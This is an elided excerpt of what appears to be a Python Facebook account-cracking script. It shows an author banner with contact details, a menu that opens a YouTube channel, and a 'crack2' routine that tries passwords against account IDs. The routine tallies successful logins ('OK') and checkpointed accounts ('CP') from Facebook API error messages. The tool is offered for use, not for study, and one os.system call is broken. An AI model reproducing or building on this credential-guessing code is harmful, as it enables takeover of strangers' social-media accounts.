...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m>>>>>>      \x1b[93;1mASMAT KHAN
\x1b[93;1m Whatsapp     \x1b[92;1m=>>>>>      \x1b[93;1m+923402135201
\x1b[93;1m YouTube      \x1b[92;1m>>>>>>    \x1b[93;1mAsmat Gaming Yt
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/channel/UCXk8Qlt6Nk8_BUmLlEp-p6A")
		exit()
	else:
		os.system("https://youtube.com/channel/UCXk8Qlt6Nk8_BUmLlEp-p6A")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [ASMAT] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [ASMAT-CP] %s|%s        '%(b,idf,pw))
